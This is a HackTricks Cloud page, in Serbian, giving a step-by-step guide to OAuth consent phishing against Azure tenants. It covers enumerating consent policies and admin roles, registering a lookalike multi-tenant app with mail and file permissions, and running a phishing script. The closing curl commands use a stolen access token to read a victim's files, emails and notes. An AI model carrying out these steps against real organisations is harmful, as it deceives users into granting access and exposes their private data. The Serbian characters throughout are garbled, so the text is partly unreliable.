# Az - OAuth Apps Phishing

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## OAuth App Phishing

**Azure aplikacije** su konfigurisane sa dozvolama koje 캖e mo캖i da koriste kada korisnik pristane na aplikaciju (kao 코to su enumeracija direktorijuma, pristup datotekama ili izvr코avanje drugih radnji). Imajte na umu da aplikacija deluje u ime korisnika, tako da 캜ak i ako aplikacija mo쬰 tra쬴ti administratorske dozvole, ako **korisnik koji pristaje na to nema tu dozvolu**, aplikacija **ne캖e mo캖i da izvr코ava administratorske radnje**.

### Dozvole za pristajanje aplikacija

Podrazumevano, svaki **korisnik mo쬰 dati pristanak aplikacijama**, iako se ovo mo쬰 konfigurisati tako da korisnici mogu pristati samo na **aplikacije od verifikovanih izdava캜a za odabrane dozvole** ili 캜ak **ukloniti dozvolu** korisnicima da pristaju na aplikacije.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Ako korisnici ne mogu da pristanu, **administratori** kao 코to su `GA`, `Administrator aplikacije` ili `Administrator Cloud aplikacije` mogu **pristati na aplikacije** koje korisnici mogu koristiti.

맚avi코e, ako korisnici mogu pristati samo na aplikacije koje koriste **niskorizi캜ne** dozvole, ove dozvole su podrazumevano **openid**, **profil**, **email**, **User.Read** i **offline\_access**, iako je mogu캖e **dodati vi코e** na ovu listu.

I ako mogu pristati na sve aplikacije, mogu pristati na sve aplikacije.

### 2 vrste napada

* **Neautentifikovani**: Iz spoljnog naloga kreirati aplikaciju sa **niskorizi캜nim dozvolama** `User.Read` i `User.ReadBasic.All`, na primer, prevariti korisnika, i mo캖i 캖ete da pristupite informacijama iz direktorijuma.
* Ovo zahteva da prevareni korisnik bude **u mogu캖nosti da prihvati OAuth aplikacije iz spoljnog tenanta**
* Ako je prevareni korisnik neki administrator koji mo쬰 **pristati na bilo koju aplikaciju sa bilo kojim dozvolama**, aplikacija bi tako캠e mogla **tra쬴ti privilegovane dozvole**
* **Autentifikovani**: Nakon 코to je kompromitovan glavni korisnik sa dovoljno privilegija, **kreirati aplikaciju unutar naloga** i **prevariti** nekog **privilegovanog** korisnika koji mo쬰 prihvatiti privilegovane OAuth dozvole.
* U ovom slu캜aju ve캖 mo쬰te pristupiti informacijama iz direktorijuma, tako da dozvola `User.ReadBasic.All` vi코e nije zanimljiva.
* Verovatno ste zainteresovani za **dozvole koje zahtevaju da ih administrator odobri**, jer obi캜an korisnik ne mo쬰 dati OAuth aplikacijama bilo koju dozvolu, zato treba da **prevarite samo te korisnike** (vi코e o tome koje uloge/dozvole daju ovu privilegiju kasnije)

### Korisnicima je dozvoljeno da pristanu

Imajte na umu da morate izvr코iti ovu komandu iz naloga unutar tenanta, ne mo쬰te prona캖i ovu konfiguraciju tenanta iz spoljnog. Slede캖i CLI mo쬰 vam pomo캖i da razumete dozvole korisnika:

{% code overflow="wrap" %}
```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"
```
{% endcode %}

* Korisnici mogu da daju saglasnost za sve aplikacije: Ako unutar **`permissionGrantPoliciesAssigned`** prona캠ete: `ManagePermissionGrantsForSelf.microsoft-user-default-legacy` tada korisnici mogu da prihvate svaku aplikaciju.
* Korisnici mogu da daju saglasnost za aplikacije od verifikovanih izdava캜a ili va코e organizacije, ali samo za dozvole koje odaberete: Ako unutar **`permissionGrantPoliciesAssigned`** prona캠ete: `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-team` tada korisnici mogu da prihvate svaku aplikaciju.
* **Onemogu캖ite saglasnost korisnika**: Ako unutar **`permissionGrantPoliciesAssigned`** mo쬰te prona캖i samo: `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-chat` i `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-team` tada korisnici ne mogu dati saglasnost.

Mogu캖e je prona캖i zna캜enje svake od komentarisane politika u:

{% code overflow="wrap" %}
```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/permissionGrantPolicies"
```
{% endcode %}

### **Administratori aplikacija**

Proverite korisnike koji se smatraju administratorima aplikacija (mogu prihvatiti nove aplikacije):

{% code overflow="wrap" %}
```bash
# Get list of roles
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles"

# Get Global Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1b2256f9-46c1-4fc2-a125-5b2f51bb43b7/members"

# Get Application Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1e92c3b7-2363-4826-93a6-7f7a5b53e7f9/members"

# Get Cloud Applications Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/0d601d27-7b9c-476f-8134-8e7cd6744f02/members"
```
{% endcode %}

## **Pregled Tokova Napada**

Napad se sastoji od nekoliko koraka koji ciljaju generi캜ku kompaniju. Evo kako bi to moglo izgledati:

1. **Registracija Domen i Hosting Aplikacije**: Napada캜 registruje domen koji podse캖a na pouzdanu stranicu, na primer, "safedomainlogin.com". Pod ovim domenom se kreira poddomen (npr. "companyname.safedomainlogin.com") za hosting aplikacije dizajnirane da prikupi autorizacione kodove i zatra쬴 pristupne tokene.
2. **Registracija Aplikacije u Azure AD**: Napada캜 zatim registruje Multi-Tenant Aplikaciju u svom Azure AD Tenant-u, nazivaju캖i je po ciljanom preduze캖u kako bi izgledala legitimno. Konfiguri코e URL za preusmeravanje aplikacije da upu캖uje na poddomen koji hostuje zlonamernu aplikaciju.
3. **Postavljanje Dozvola**: Napada캜 postavlja aplikaciju sa raznim API dozvolama (npr. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Ove dozvole, kada ih korisnik odobri, omogu캖avaju napada캜u da izvu캜e osetljive informacije u ime korisnika.
4. **Distribucija Zlonamernih Linkova**: Napada캜 kreira link koji sadr쬴 ID klijenta zlonamerne aplikacije i deli ga sa ciljnim korisnicima, obmanjuju캖i ih da daju saglasnost.

## Primer Napada

1. Registrujte **novu aplikaciju**. Mo쬰 biti samo za trenutni direktorijum ako koristite korisnika iz napadnutog direktorijuma ili za bilo koji direktorijum ako je ovo spolja코nji napad (kao na slede캖oj slici).
1. Tako캠e postavite **redirect URI** na o캜ekivani URL gde 쬰lite da primite kod za dobijanje tokena (`http://localhost:8000/callback` po defaultu).

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

2. Zatim kreirajte tajnu aplikacije:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

3. Izaberite API dozvole (npr. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`)

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

4. **Izvr코ite veb stranicu (**[**azure\_oauth\_phishing\_example**](https://github.com/carlospolop/azure_oauth_phishing_example)**)** koja tra쬴 dozvole:

{% code overflow="wrap" %}
```bash
# From https://github.com/carlospolop/azure_oauth_phishing_example
python3 azure_oauth_phishing_example.py --client-secret <client-secret> --client-id <client-id> --scopes "email,Files.ReadWrite.All,Mail.Read,Notes.Read.All,offline_access,openid,profile,User.Read"
```
{% endcode %}

5. **Po코aljite URL rtvi**
1. U ovom slu캜aju `http://localhost:8000`
6. **콯rtve** treba da **prihvate obave코tenje:**

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

7. Koristite **pristupni token za pristup tra쬰nim dozvolama**:
```bash
export ACCESS_TOKEN=<ACCESS_TOKEN>

# List drive files
curl -X GET \
https://graph.microsoft.com/v1.0/me/drive/root/children \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"

# List eails
curl -X GET \
https://graph.microsoft.com/v1.0/me/messages \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"

# List notes
curl -X GET \
https://graph.microsoft.com/v1.0/me/onenote/notebooks \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"
```
## Other Tools

* [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)**:** Proverite [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) da biste saznali kako da ga konfiguri코ete.
* [**O365-Attack-Toolkit**](https://github.com/mdsecactivebreach/o365-attack-toolkit)

## Post-Exploitation

### Phishing Post-Exploitation

U zavisnosti od tra쬰nih dozvola, mo쬯a 캖ete mo캖i da **pristupite razli캜itim podacima o zakupcu** (lista korisnika, grupa... ili 캜ak da modifikujete pode코avanja) i **informacijama o korisniku** (fajlovi, bele코ke, e-mailovi...). Zatim, mo쬰te koristiti ove dozvole da izvr코ite te radnje.

### Application Post Exploitation

Proverite sekcije Aplikacije i Servisni Principal na stranici:

{% content-ref url="../az-privilege-escalation/az-entraid-privesc/" %}
[az-entraid-privesc](../az-privilege-escalation/az-entraid-privesc/)
{% endcontent-ref %}

## References

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
